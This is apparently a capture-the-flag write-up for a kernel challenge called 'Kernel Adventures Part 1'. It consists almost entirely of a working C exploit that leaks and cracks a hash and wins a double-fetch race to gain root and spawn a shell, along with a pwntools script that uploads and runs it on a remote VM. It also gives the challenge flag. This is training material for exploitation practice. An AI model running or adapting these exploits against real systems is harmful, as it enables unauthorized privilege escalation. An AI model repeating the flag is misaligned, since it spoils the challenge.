---
title: Kernel Adventures Part 1
date: '2025-01-15T10:00:00+05:30'
event: Blog Post
category: writeup
difficulty: Intermediate
author:
- VulnX
tags:
- pwn
- kernel
- race condition
description: 'Explanation  {% include embed/youtube.html id=''i1C9GRfMtYE'' %}   Solution  c
  // Compile with: muslgcc static o exploit exploit.c include <fcntl.h> inc...'
---
## Explanation

{% include embed/youtube.html id='i1C9GRfMtYE' %}

## Solution

```c
// Compile with: musl-gcc -static -o exploit exploit.c
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int fd;
bool finished = false;
uint32_t hash;
struct user_data {
  uint32_t id;
  uint32_t password;
  uint32_t zero; // Null terminate the above password
};

struct user_data user;

void open_device() {
  printf("[*] Opening device...");
  fd = open("/dev/mysu", O_RDWR);
  if (fd < 0) {
    perror("open");
    exit(-1);
  }
  printf("fd = %d\n", fd);
}

void get_shell() {
  if (getuid() == 0) {
    puts("[+] We are root!");
    system("/bin/sh");
    exit(0);
  } else {
    puts("[X] Oops! Not root.");
    exit(-1);
  }
}

void *reset(void *arg) {
  while (!finished) {
    user.id = 1000;
  }
  return NULL;
}

void *set(void *arg) {
  while (!finished) {
    user.id = 0;
  }
  return NULL;
}

void race() {
  puts("[*] Starting race...");
  pthread_t t1;
  pthread_t t2;
  pthread_create(&t1, NULL, &reset, NULL);
  pthread_create(&t2, NULL, &set, NULL);
  user.zero = 0;
  while (getuid() != 0) {
    write(fd, &user, 8);
  }
  finished = true;
  puts("[+] Race won!");
  pthread_join(t1, NULL);
  pthread_join(t2, NULL);
}

void leak_hash() {
  int arr[2];
  read(fd, arr, sizeof(arr));
  hash = arr[1];
  printf("[!] Hash leak: %#x\n", hash);
}

__attribute__((optimize(3))) void crack_hash() {
  puts("[*] Cracking hash...");
  uint32_t calc_hash = 0;
  uint32_t candidate = 0;
  while (calc_hash != hash) {
    candidate++;
    calc_hash = 0;
    for (int i = 0; i < 4; i++) {
      calc_hash += (int)*((char *)&candidate + i);
      calc_hash += calc_hash << 0xa;
      calc_hash ^= calc_hash >> 6;
      calc_hash ^= (int)*((char *)&candidate + i);
    }
  }
  printf("[+] Hash cracked...password = %#x\n", candidate);
  user.password = candidate;
}

int main(void) {
  open_device();
  leak_hash();
  crack_hash();
  race();
  get_shell();
  return 0;
}
```
{: file="exploit.c"}


```py
from pwn import *
from gzip import GzipFile
from io import BytesIO

# Edit these
host = 'localhost'
port = 1337

def chunk_exploit(exploit):
    for i in range(0, len(exploit), 500):
        yield exploit[i:i+500]

exploit = BytesIO()
with open('./exploit', 'rb') as f_in:
    with GzipFile(fileobj=exploit, mode='wb') as f_out:
        f_out.write(f_in.read())
exploit = exploit.getvalue()
exploit = b64e(exploit)

io = remote(host, port)

print('waiting for vm to load')
io.recvuntil(b'$')
for chunk in chunk_exploit(exploit):
    io.sendline('echo -n "{}" >> exploit.gz.b64'.format(chunk).encode())
io.sendline(b'base64 -d exploit.gz.b64 > exploit.gz')
io.sendline(b'gunzip exploit.gz')
io.sendline(b'chmod +x exploit')
io.sendline(b'./exploit')
io.interactive()
```
{: file="solve.py"}

## Flag

`HTB{C0ngr4ts_y0u_3xpl0it3d_A_D0uBlE-FeTcH}`
